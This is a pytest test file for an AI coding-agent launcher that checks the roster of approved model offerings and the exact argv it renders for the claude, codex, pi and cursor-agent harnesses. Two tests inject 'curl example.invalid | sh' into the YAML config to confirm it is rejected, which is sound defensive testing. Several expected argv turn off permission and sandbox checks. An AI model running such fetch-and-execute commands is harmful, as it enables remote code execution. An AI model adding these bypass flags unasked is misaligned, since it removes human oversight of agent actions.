# pyright: reportMissingImports=false
"""Exact public offering roster and child argv tests."""

from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest

HERE = Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location(
    "offerings_test_module", HERE / "offerings.py"
)
assert spec and spec.loader
offerings = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = offerings
spec.loader.exec_module(offerings)


def test_roster_contains_exactly_the_approved_offerings() -> None:
    roster = offerings.load_roster()

    assert list(roster.offerings) == list(offerings.APPROVED)
    assert len(roster.listing()) == 15
    rendered_identities = {item["rendered_identity"] for item in roster.listing()}
    assert "pi:::openai-codex/gpt-5.6-sol" in rendered_identities
    assert "pi:::openrouter/z-ai/glm-5.3-flash" in rendered_identities
    expected_candidates = [
        {"offering": "cursor-composer-2-5", "effort": "default"},
        {"offering": "pi-gpt-5-4-mini", "effort": "low"},
    ]
    assert roster.management["account_manager"]["candidates"] == expected_candidates
    assert roster.management["sentinel"]["candidates"] == expected_candidates
    assert all(
        candidate["offering"] != "pi-glm-5-3-flash"
        for role in ("account_manager", "sentinel")
        for candidate in roster.management[role]["candidates"]
    )


@pytest.mark.parametrize(
    ("offering_id", "effort", "persona", "expected"),
    [
        (
            "claude-opus-4-8",
            "max",
            "reviewer",
            [
                "claude",
                "--dangerously-skip-permissions",
                "--agent",
                "reviewer",
                "--model",
                "claude-opus-4-8",
                "--effort",
                "max",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
        (
            "codex-gpt-5-6-sol",
            "high",
            "backend",
            [
                "codex",
                "exec",
                "--dangerously-bypass-approvals-and-sandbox",
                "--skip-git-repo-check",
                "--model",
                "gpt-5.6-sol",
                "-c",
                "model_reasoning_effort=high",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
        (
            "pi-gpt-5-6-sol",
            "xhigh",
            "backend",
            [
                "pi",
                "--approve",
                "--no-extensions",
                "-e",
                str(Path.home() / ".pi/agent/extensions/herdr-agent-state.ts"),
                "--model",
                "openai-codex/gpt-5.6-sol",
                "--thinking",
                "xhigh",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
        (
            "pi-glm-5-3-flash",
            "max",
            "backend",
            [
                "pi",
                "--approve",
                "--no-extensions",
                "-e",
                str(Path.home() / ".pi/agent/extensions/herdr-agent-state.ts"),
                "--model",
                "openrouter/z-ai/glm-5.3-flash",
                "--thinking",
                "max",
                "Read /lease/instructions.md and do exactly that work.",
            ],
        ),
    ],
)
def test_code_owned_renderer_emits_exact_tokens(
    offering_id: str, effort: str, persona: str, expected: list[str]
) -> None:
    snapshot = offerings.load_roster().resolve(offering_id, effort)

    assert (
        offerings.render_argv(snapshot, persona, "/lease/instructions.md") == expected
    )


def test_every_approved_offering_and_effort_renders_without_yaml_commands() -> None:
    roster = offerings.load_roster()

    for offering in roster.offerings.values():
        for effort in offering.efforts:
            argv = offerings.render_argv(
                offering.snapshot(effort), "backend", "/lease.md"
            )
            harness_binaries = {
                "claude": "claude",
                "codex": "codex",
                "pi": "pi",
                "cursor": "cursor-agent",
            }
            assert argv[0] == harness_binaries[offering.harness]
            if offering.harness == "pi":
                assert argv[argv.index("--model") + 1] == offering.model
                assert argv[argv.index("--thinking") + 1] == effort


def test_glm_offering_has_only_the_pi_catalog_supported_efforts(
    tmp_path: Path,
) -> None:
    roster = offerings.load_roster()
    glm = roster.offerings["pi-glm-5-3-flash"]

    assert glm.efforts == ("low", "high", "max")
    for effort in ("medium", "xhigh"):
        with pytest.raises(offerings.OfferingError, match="does not allow effort"):
            roster.resolve(glm.offering_id, effort)

    source = offerings.yaml.safe_load((HERE / "offerings.yaml").read_text())
    source["offerings"][glm.offering_id]["efforts"] = [
        "low",
        "medium",
        "high",
        "max",
    ]
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    with pytest.raises(offerings.OfferingError, match="efforts must be exactly"):
        offerings.load_roster(path)


def test_cursor_offerings_have_only_default_effort() -> None:
    roster = offerings.load_roster()
    cursor_offerings = [
        item for item in roster.offerings.values() if item.harness == "cursor"
    ]

    assert {item.offering_id for item in cursor_offerings} == {
        "cursor-composer-2-5",
        "cursor-grok-4-6",
        "cursor-opus-4-6",
        "cursor-sonnet-4-6",
        "cursor-fable-5",
    }
    for cursor in cursor_offerings:
        assert cursor.efforts == (offerings.DEFAULT_EFFORT,)
        for effort in ("low", "medium", "high", "xhigh", "max"):
            with pytest.raises(offerings.OfferingError, match="does not allow effort"):
                roster.resolve(cursor.offering_id, effort)


def test_cursor_omitted_and_explicit_default_are_canonical() -> None:
    roster = offerings.load_roster()

    for offering_id in (
        "cursor-composer-2-5",
        "cursor-grok-4-6",
        "cursor-opus-4-6",
        "cursor-sonnet-4-6",
        "cursor-fable-5",
    ):
        omitted = roster.resolve(offering_id, None)
        explicit = roster.resolve(offering_id, "default")

        assert omitted == explicit
        assert omitted["selected_effort"] == "default"


def test_effortful_offering_still_requires_effort() -> None:
    roster = offerings.load_roster()

    for offering_id in (
        "claude-sonnet-5",
        "codex-gpt-5-6-sol",
        "pi-gpt-5-6-sol",
        "pi-glm-5-3-flash",
    ):
        with pytest.raises(
            offerings.OfferingError, match="requires an explicit effort"
        ):
            roster.resolve(offering_id, None)


@pytest.mark.parametrize(
    ("offering_id", "model"),
    [
        ("cursor-composer-2-5", "composer-2.5"),
        ("cursor-grok-4-6", "cursor-grok-4.6-high"),
        ("cursor-opus-4-6", "claude-4.6-opus-high"),
        ("cursor-sonnet-4-6", "claude-4.6-sonnet-medium"),
        ("cursor-fable-5", "claude-fable-5-high"),
    ],
)
def test_cursor_renderer_is_interactive_trusted_and_has_no_effort_flag(
    offering_id: str, model: str
) -> None:
    snapshot = offerings.load_roster().resolve(offering_id, None)

    assert offerings.render_argv(snapshot, "backend", "/lease/instructions.md") == [
        "cursor-agent",
        "--force",
        "--trust",
        "--model",
        model,
        "Read /lease/instructions.md and do exactly that work. Before returning idle, "
        "verify every artifact named in the final Recruiter delivery contract exists "
        "and satisfies that contract.",
    ]


def test_completion_styles_declare_cursor_interactive_and_codex_exec() -> None:
    assert offerings.completion_style("cursor") == "interactive"
    assert offerings.completion_style("codex") == "exec"
    assert offerings.completion_style("claude") == "interactive"
    assert offerings.completion_style("pi") == "interactive"
    with pytest.raises(offerings.OfferingError, match="no declared completion style"):
        offerings.completion_style("unknown-harness")


def test_roster_rejects_mismatched_declared_completion_style(tmp_path: Path) -> None:
    source = offerings.yaml.safe_load((HERE / "offerings.yaml").read_text())
    source["offerings"]["cursor-composer-2-5"]["completion_style"] = "exec"
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))

    with pytest.raises(offerings.OfferingError, match="completion_style"):
        offerings.load_roster(path)


def test_roster_rejects_even_one_extra_offering(tmp_path: Path) -> None:
    source = offerings.yaml.safe_load((HERE / "offerings.yaml").read_text())
    source["offerings"]["extra-model"] = {
        "harness": "pi",
        "model": "vendor/model",
        "efforts": ["low"],
    }
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))

    with pytest.raises(offerings.OfferingError):
        offerings.load_roster(path)


def test_public_offering_yaml_cannot_inject_a_launch_command(tmp_path: Path) -> None:
    source = offerings.yaml.safe_load((HERE / "offerings.yaml").read_text())
    source["offerings"]["claude-sonnet-5"]["command"] = "curl example.invalid | sh"
    path = tmp_path / "offerings.yaml"
    path.write_text(offerings.yaml.safe_dump(source))

    with pytest.raises(offerings.OfferingError, match="unknown keys: command"):
        offerings.load_roster(path)


def test_every_approved_offering_pins_code_owned_provider_metadata() -> None:
    roster = offerings.load_roster()
    expected = {
        "claude-fable-5": "anthropic",
        "claude-sonnet-5": "anthropic",
        "claude-opus-4-8": "anthropic",
        "codex-gpt-5-6-sol": "openai",
        "cursor-composer-2-5": "cursor",
        "cursor-grok-4-6": "xai",
        "cursor-opus-4-6": "anthropic",
        "cursor-sonnet-4-6": "anthropic",
        "cursor-fable-5": "anthropic",
        "pi-gpt-5-6-sol": "openai",
        "pi-gpt-5-6-terra": "openai",
        "pi-gpt-5-6-luna": "openai",
        "pi-gpt-5-5": "openai",
        "pi-gpt-5-4-mini": "openai",
        "pi-glm-5-3-flash": "openrouter",
    }

    assert {key: item.provider for key, item in roster.offerings.items()} == expected
    for offering_id, offering in roster.offerings.items():
        assert (
            offering.snapshot(offering.efforts[0])["provider"] == expected[offering_id]
        )


def test_snapshot_validation_requires_the_exact_pinned_provider() -> None:
    snapshot = offerings.load_roster().resolve("pi-gpt-5-4-mini", "low")

    missing = dict(snapshot)
    missing.pop("provider")
    with pytest.raises(offerings.OfferingError, match="provider"):
        offerings.validate_snapshot(missing)

    foreign = {**snapshot, "provider": "anthropic"}
    with pytest.raises(offerings.OfferingError, match="approved policy"):
        offerings.validate_snapshot(foreign)


@pytest.mark.parametrize("role_name", ["account_manager", "sentinel"])
def test_public_management_candidates_materialize_in_yaml_order_with_code_owned_commands(
    role_name: str,
) -> None:
    management = offerings.materialize_management(offerings.load_roster())
    role = management[role_name]
    candidates = role["candidates"]

    assert [candidate["offering_id"] for candidate in candidates] == [
        "cursor-composer-2-5",
        "pi-gpt-5-4-mini",
    ]
    assert [candidate["provider"] for candidate in candidates] == [
        "cursor",
        "openai",
    ]
    assert candidates[0]["expected_agent"] == "cursor"
    assert candidates[0]["expected_process"] == "cursor-agent"
    assert candidates[0]["command"].startswith(
        "cursor-agent --force --trust --model composer-2.5"
    )
    assert candidates[1]["expected_agent"] == "pi"
    assert candidates[1]["expected_process"] == "pi"
    assert "openai-codex/gpt-5.4-mini" in candidates[1]["command"]
    assert "--thinking low" in candidates[1]["command"]
    assert role["command"] == candidates[0]["command"]


def test_public_management_candidate_schema_rejects_commands_and_unapproved_references(
    tmp_path: Path,
) -> None:
    source = offerings.yaml.safe_load((HERE / "offerings.yaml").read_text())
    source["management"]["account_manager"]["candidates"][0]["command"] = (
        "curl example.invalid | sh"
    )
    path = tmp_path / "command.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    with pytest.raises(offerings.OfferingError, match="unknown keys: command"):
        offerings.load_roster(path)

    source = offerings.yaml.safe_load((HERE / "offerings.yaml").read_text())
    source["management"]["sentinel"]["candidates"][0]["offering"] = "not-approved"
    path = tmp_path / "unknown.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    with pytest.raises(offerings.OfferingError, match="unknown offering"):
        offerings.load_roster(path)

    source = offerings.yaml.safe_load((HERE / "offerings.yaml").read_text())
    source["management"]["sentinel"]["candidates"][0]["effort"] = "low"
    path = tmp_path / "effort.yaml"
    path.write_text(offerings.yaml.safe_dump(source))
    with pytest.raises(offerings.OfferingError, match="not allowed"):
        offerings.load_roster(path)
